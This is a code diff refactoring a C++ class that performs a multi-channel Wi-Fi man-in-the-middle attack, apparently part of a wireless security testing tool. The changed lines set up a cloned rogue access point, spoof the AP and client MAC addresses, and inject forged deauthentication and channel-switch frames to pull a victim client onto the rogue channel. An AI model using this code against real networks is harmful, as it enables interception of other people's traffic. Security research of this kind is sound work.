@@ -32,8 +32,8 @@ McMitm::McMitm(const ActorPtr &rogue_sta,
       ssid(std::move(ssid)),
         // TODO fallback to info from actors
       ap_mac(ap_mac),
-      client_mac(client_mac),
-      only_to_mitm(only_to_mitm){}
+      only_to_mitm(only_to_mitm),
+      client_state(client_mac){}
 
 McMitm::~McMitm(){ stop(); }
 
@@ -71,7 +71,7 @@ void McMitm::send_disas(const HWAddress<6> &macaddr) const{
     log(LogLevel::INFO, "Rogue channel: injected Disassociation to " + macaddr.to_string());
 }
 
-void McMitm::queue_disas(const HWAddress<6> &macaddr){
+/*void McMitm::queue_disas(const HWAddress<6> &macaddr){
     const bool already_queued = ranges::any_of(disas_queue,
         [&](const auto &entry){ return entry.second == macaddr; });
     if(already_queued) return;
@@ -84,11 +84,11 @@ void McMitm::queue_disas(const HWAddress<6> &macaddr){
 void McMitm::try_channel_switch(const HWAddress<6> &macaddr){
     send_csa_beacon();
     queue_disas(macaddr);
-}
+}*/
 
 void McMitm::send_deauth_as_ap() const{
     Dot11Deauthentication deauth;
-    deauth.addr1(client_mac);
+    deauth.addr1(client_state.get_mac());
     deauth.addr2(ap_mac);
     deauth.addr3(ap_mac);
     deauth.reason_code(3);
@@ -115,6 +115,7 @@ void McMitm::configure_interfaces(){
     log(LogLevel::INFO,
         "Note: keep >1 meter between interfaces. Else packet delivery is unreliable & target may disconnect");
 
+    //FIXME useless?
     rogue_sta->run({"iw", "dev", nic_real_ap, "del"});
     rogue_ap->run({"iw", "dev", nic_rogue_ap, "del"});
 }
@@ -165,11 +166,11 @@ void McMitm::run(RunStatus &rs, const int timeout_sec){
     // const bool start_nic_real_ap = !hw_capabilities::set_monitor_active(rogue_sta["iface"], netconfig.real_channel);
     const bool start_nic_real_ap = true;
     if(start_nic_real_ap){
-        rogue_sta->set_mac_address(client_mac.to_string());
-        start_ap(rs, nic_real_ap, rogue_sta, netconfig.real_channel, *beacon, client_mac.to_string());
+        rogue_sta->set_mac_address(client_state.get_mac());
+        start_ap(rs, nic_real_ap, rogue_sta, netconfig.real_channel, *beacon, client_state.get_mac().to_string());
     } else{
         hw_capabilities::set_iface_down(nic_real_ap, rogue_sta->str_con.at("netns"));
-        rogue_sta->set_mac_address(client_mac.to_string());
+        rogue_sta->set_mac_address(client_state.get_mac());
         hw_capabilities::run_cmd({"iw", rogue_sta["iface"], "set", "monitor", "active"}, rogue_sta->str_con.at("netns"));
         this_thread::sleep_for(seconds(15));
         rogue_sta->run({"iw", "dev", rogue_sta["iface"], "set", "channel", to_string(netconfig.real_channel)});
@@ -177,19 +178,20 @@ void McMitm::run(RunStatus &rs, const int timeout_sec){
     rogue_sta->set_iface_up();
     rogue_sta->run({"iw", "dev", rogue_sta["iface"], "set", "channel", to_string(netconfig.real_channel)});
 
+    //FIXME change to wlan host or add comment
     string bpf = "(wlan addr1 " + ap_mac.to_string() + ") or (wlan addr2 " + ap_mac.to_string() + ")";
-    bpf += " or (wlan addr1 " + client_mac.to_string() + ") or (wlan addr2 " + client_mac.to_string() + ")";
+    bpf += " or (wlan addr1 " + client_state.get_mac().to_string() + ") or (wlan addr2 " +  client_state.get_mac().to_string() + ")";
     bpf = "(wlan type data or wlan type mgt) and (" + bpf + ")";
 
     sock_real = make_unique<MonitorSocket>(rogue_sta["iface"]);
     sock_real->set_filter(bpf);
 
     // set up the rogue AP and interfaces
-    log(LogLevel::INFO, "Setting MAC address of {} to {}", nic_rogue_ap, ap_mac.to_string());
+    log(LogLevel::INFO, "Setting MAC address of {} to {}", nic_rogue_ap, ap_mac);
     rogue_ap->set_iface_up();
-    rogue_ap->set_mac_address(ap_mac.to_string());
+    rogue_ap->set_mac_address(ap_mac);
     // Set up a rogue AP that clones the target network -> ACK back to client
-    start_ap(rs, nic_rogue_ap, rogue_ap, netconfig.rogue_channel, *beacon, ap_mac.to_string());
+    start_ap(rs, nic_rogue_ap, rogue_ap, netconfig.rogue_channel, *beacon, ap_mac);
     //hw_capabilities::run_cmd({"iw", "dev", nic_real_ap, "station", "add", client_mac.to_string()}, rogue_sta->str_con.at("netns"), false);
 
     sock_rogue = make_unique<MonitorSocket>(rogue_ap["iface"]);
@@ -200,6 +202,7 @@ void McMitm::run(RunStatus &rs, const int timeout_sec){
 
     // first disconnect
     send_csa_beacon(4);
+    client_state.update_state(ClientState::Sent_to_rogue);
 
     /* only for non MFP requests*/
     Dot11Deauthentication deauth{};
@@ -245,14 +248,13 @@ void McMitm::run(RunStatus &rs, const int timeout_sec){
         if (FD_ISSET(fd_rogue, &read_fds)){
             while(auto recv_res = sock_rogue->recv()) handle_rx_rogue_chan(std::move(recv_res.pdu), recv_res.raw);
         }
-        while (!disas_queue.empty() && disas_queue.front().first <= steady_clock::now()) {
+        /*while (!disas_queue.empty() && disas_queue.front().first <= steady_clock::now()) {
             send_disas(disas_queue.front().second);
             disas_queue.erase(disas_queue.begin());
-        }
+        }*/
 
         if (next_beacon <= steady_clock::now()) {
-            const bool client_associated = clients.contains(client_mac) &&
-                    clients.at(client_mac)->state >= ClientState::GotMitm;
+            const bool client_associated = client_state.get_state() >= ClientState::GotMitm;
             if(!client_associated)
                 send_csa_beacon(1);
             next_beacon += milliseconds(10); //TODO add to attack config
@@ -305,10 +307,5 @@ void McMitm::patch_channel_raw(vector<uint8_t> &beacon_raw, const uint8_t channe
         pos += 2 + len;
     }
 
-}
-
-ClientState *McMitm::find_client(const string &mac){
-    const auto it = clients.find(mac);
-    return it != clients.end() ? it->second.get() : nullptr;
 }
 }
